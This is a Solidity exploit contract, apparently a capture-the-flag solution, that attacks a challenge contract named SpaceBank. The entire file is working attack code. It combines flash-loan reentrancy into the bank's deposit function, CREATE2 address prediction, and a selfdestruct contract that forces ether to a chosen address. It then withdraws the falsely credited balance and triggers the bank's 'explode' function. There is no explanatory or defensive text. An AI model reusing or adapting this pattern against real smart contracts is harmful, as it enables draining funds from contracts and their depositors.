// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.4;

import "openzeppelin/access/Ownable.sol";
import "openzeppelin/token/ERC20/IERC20.sol";

import "forge-std/console.sol";

import {SpaceBank} from "src/SpaceBank.sol";

contract Exploit is Ownable {
    SpaceBank private spaceBank;
    IERC20 private spaceToken;
    uint8 attackCount;

    constructor(address _spaceBank) Ownable(msg.sender) {
        spaceBank = SpaceBank(_spaceBank);
        spaceToken = spaceBank.token();
    }

    function attack() external payable onlyOwner {
        address destructor = getDestructorAddress(block.number);
        (bool sent,) = destructor.call{value: msg.value}("");
        require(sent, "Failed to send ether to Destructor");
        spaceBank.flashLoan(spaceToken.balanceOf(address(spaceBank)) - 1, address(this));
        spaceBank.flashLoan(1, address(this));
    }

    function withdraw() external onlyOwner {
        spaceBank.withdraw(spaceBank.balances(address(this)));
    }

    function explode() external onlyOwner {
        spaceBank.explodeSpaceBank();
    }

    function executeFlashLoan(uint256 _amount) external {
        require(msg.sender == address(spaceBank), "Only spaceBank can executeFlashLoan");
        // 1st step
        if (attackCount % 2 == 0) {
            spaceToken.approve(address(spaceBank), _amount);
            spaceBank.deposit(_amount, abi.encode(block.number % 47));
            attackCount += 1;
        } else {
            // 2nd step
            spaceToken.approve(address(spaceBank), 1);
            spaceBank.deposit(_amount, type(Destructor).creationCode);
        }
    }

    function getDestructorAddress(uint256 _salt) private view returns (address) {
        bytes memory byteCode = type(Destructor).creationCode;
        // SpaceBank would be the deployer of the destructor contract
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(spaceBank), _salt, keccak256(byteCode)));
        return address(uint160(uint256(hash)));
    }
}

contract Destructor {
    constructor() {
        selfdestruct(payable(msg.sender));
    }
}
